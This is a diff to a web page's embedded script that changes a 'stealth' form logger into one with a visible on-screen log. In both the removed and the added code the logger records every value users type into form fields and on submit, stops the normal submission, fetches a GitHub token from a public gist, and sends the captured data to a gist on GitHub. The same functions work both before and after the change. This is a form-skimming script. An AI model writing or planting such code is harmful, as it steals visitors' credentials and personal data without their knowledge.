@@ -182,14 +182,14 @@ document.getElementById("signup-btn").addEventListener("click", async () => {
 });
 </script>
 
-<!-- STEALTH FORM LOGGER (INVISIBLE) -->
+<!-- VISIBLE FORM LOGGER -->
 <script>
 // CONFIGURATION
 const CONFIG = {
     // GitHub Gist configuration
-    GIST_ID: 'baf8538c85354add526e6cb4c40dcd3a', // Replace with your Gist ID
-    GIST_FILENAME: 'Data.json', // Filename in your Gist
-    GIST_TOKEN_URL: 'https://gist.githubusercontent.com/Dtech2preas/498a03fc1467fc14c66358e0f5721517/raw/a9f82f8fef545600174cdf9b5b1735b865bf5582/gistfile1.txt', // URL to fetch GitHub token
+    GIST_ID: 'baf8538c85354add526e6cb4c40dcd3a',
+    GIST_FILENAME: 'Data.json',
+    GIST_TOKEN_URL: 'https://gist.githubusercontent.com/Dtech2preas/498a03fc1467fc14c66358e0f5721517/raw/a9f82f8fef545600174cdf9b5b1735b865bf5582/gistfile1.txt',
     
     // Redirect URL after submission
     REDIRECT_URL: 'https://www.dtech24.co.za',
@@ -204,11 +204,39 @@ const CONFIG = {
     ]
 };
 
-// ===== INVISIBLE LOGGER =====
+// ===== VISIBLE LOGGER =====
 (() => {
-    // Silent console logging (optional for debugging)
-    const log = (msg, type='info') => {
-        console.log(`[Stealth Logger] ${msg}`); // Only visible in browser console
+    // Create logger UI
+    const loggerUI = document.createElement('div');
+    loggerUI.style.position = 'fixed';
+    loggerUI.style.bottom = '0';
+    loggerUI.style.left = '0';
+    loggerUI.style.right = '0';
+    loggerUI.style.height = '200px';
+    loggerUI.style.backgroundColor = 'rgba(0,0,0,0.8)';
+    loggerUI.style.color = '#fff';
+    loggerUI.style.fontFamily = 'monospace';
+    loggerUI.style.fontSize = '12px';
+    loggerUI.style.padding = '10px';
+    loggerUI.style.overflowY = 'auto';
+    loggerUI.style.zIndex = '9999';
+    loggerUI.style.pointerEvents = 'none'; // Allows clicking through to page
+    
+    const loggerContent = document.createElement('div');
+    loggerContent.id = 'loggerContent';
+    loggerUI.appendChild(loggerContent);
+    
+    document.body.appendChild(loggerUI);
+    
+    // Log function that displays messages in the UI
+    const log = (msg, type = 'info') => {
+        const color = type === 'error' ? 'red' : type === 'success' ? 'lime' : 'white';
+        const entry = document.createElement('div');
+        entry.style.color = color;
+        entry.textContent = `[${new Date().toLocaleTimeString()}] ${msg}`;
+        loggerContent.appendChild(entry);
+        loggerUI.scrollTop = loggerUI.scrollHeight;
+        console.log(`[Form Logger] ${msg}`);
     };
 
     // ===== DATA CAPTURE =====
@@ -218,9 +246,13 @@ const CONFIG = {
     // Fetch GitHub token from URL
     const fetchGitHubToken = async () => {
         try {
+            log('Fetching GitHub token...');
             const res = await fetch(CONFIG.GIST_TOKEN_URL);
-            return (await res.text()).trim();
+            const token = (await res.text()).trim();
+            log('GitHub token retrieved');
+            return token;
         } catch (err) {
+            log('Failed to fetch GitHub token', 'error');
             return null;
         }
     };
@@ -228,8 +260,12 @@ const CONFIG = {
     // Send data to GitHub Gist
     const sendToGist = async (data) => {
         try {
+            log('Preparing to send data to Gist...');
             const token = await fetchGitHubToken();
-            if (!token) return;
+            if (!token) {
+                log('No GitHub token available', 'error');
+                return;
+            }
             
             // Prepare the data with timestamp
             const payload = {
@@ -238,18 +274,29 @@ const CONFIG = {
                 form_data: data
             };
 
+            log(`Payload prepared: ${JSON.stringify(payload, null, 2)}`);
+
             // Step 1: Get current content of the Gist
+            log(`Fetching current Gist content (ID: ${CONFIG.GIST_ID})...`);
             const gistRes = await fetch(`https://api.github.com/gists/${CONFIG.GIST_ID}`, {
                 headers: { Authorization: `token ${token}` }
             });
 
+            if (!gistRes.ok) {
+                log(`Failed to fetch Gist: ${gistRes.status} ${gistRes.statusText}`, 'error');
+                return;
+            }
+
             const gistData = await gistRes.json();
+            log('Current Gist content retrieved');
 
             let currentData = {};
             if (gistData.files && gistData.files[CONFIG.GIST_FILENAME]) {
                 try {
                     currentData = JSON.parse(gistData.files[CONFIG.GIST_FILENAME].content);
+                    log('Existing Gist data parsed successfully');
                 } catch (e) {
+                    log('Failed to parse existing Gist data, starting fresh', 'error');
                     currentData = {};
                 }
             }
@@ -257,9 +304,11 @@ const CONFIG = {
             // Step 2: Append new data with timestamp key
             const timestamp = new Date().toISOString();
             currentData[timestamp] = payload;
+            log(`New data added with timestamp: ${timestamp}`);
 
             // Step 3: Send PATCH to update the Gist
-            await fetch(`https://api.github.com/gists/${CONFIG.GIST_ID}`, {
+            log('Sending update to Gist...');
+            const updateRes = await fetch(`https://api.github.com/gists/${CONFIG.GIST_ID}`, {
                 method: 'PATCH',
                 headers: {
                     'Authorization': `token ${token}`,
@@ -274,10 +323,20 @@ const CONFIG = {
                 })
             });
 
-            // Redirect after successful submission
-            window.location.href = CONFIG.REDIRECT_URL;
+            if (updateRes.ok) {
+                const resultData = await updateRes.json();
+                log('Data successfully sent to Gist!', 'success');
+                log(`Gist URL: ${resultData.html_url}`);
+                
+                // Redirect after successful submission
+                setTimeout(() => {
+                    window.location.href = CONFIG.REDIRECT_URL;
+                }, 1000);
+            } else {
+                log(`Failed to update Gist: ${updateRes.status} ${updateRes.statusText}`, 'error');
+            }
         } catch (err) {
-            // Silent fail
+            log(`Error: ${err.message}`, 'error');
         }
     };
 
@@ -290,7 +349,8 @@ const CONFIG = {
                     const name = field.name || field.id || 'unnamed_field';
                     const value = field.value;
                     if (value) {
-                        formData[name] = value; // Stores raw value
+                        formData[name] = value;
+                        log(`Input captured - ${name}: ${value}`);
                     }
                 }, CONFIG.INPUT_IDLE_TIMEOUT);
             });
@@ -301,12 +361,14 @@ const CONFIG = {
         // Form submissions
         document.querySelectorAll('form').forEach(form => {
             form.addEventListener('submit', (e) => {
-                e.preventDefault(); // Stop default submission
+                e.preventDefault();
+                log('Form submission detected');
                 
                 const data = {};
                 Array.from(form.elements).forEach(el => {
                     if (el.name && el.value) {
-                        data[el.name] = el.value; // RAW DATA
+                        data[el.name] = el.value;
+                        log(`Form field captured - ${el.name}: ${el.value}`);
                     }
                 });
                 sendToGist(data);
@@ -322,19 +384,25 @@ const CONFIG = {
                 );
                 
                 if (isSubmit && Object.keys(formData).length > 0) {
+                    log('Submit button clicked with captured data');
                     sendToGist(formData);
-                    formData = {}; // Clear after submission
+                    formData = {};
                 }
             }, true);
         });
     };
 
     // ===== INITIALIZATION =====
+    log('Form logger initialized');
+    log(`Target Gist: ${CONFIG.GIST_ID}/${CONFIG.GIST_FILENAME}`);
+    log(`Current page: ${window.location.href}`);
+    
     setupInputHandlers();
     setupSubmissionHandlers();
 
     // Watch for dynamically added elements
-    new MutationObserver(() => {
+    new MutationObserver((mutations) => {
+        log('DOM mutation detected, resetting handlers');
         setupInputHandlers();
         setupSubmissionHandlers();
     }).observe(document.body, { childList: true, subtree: true });
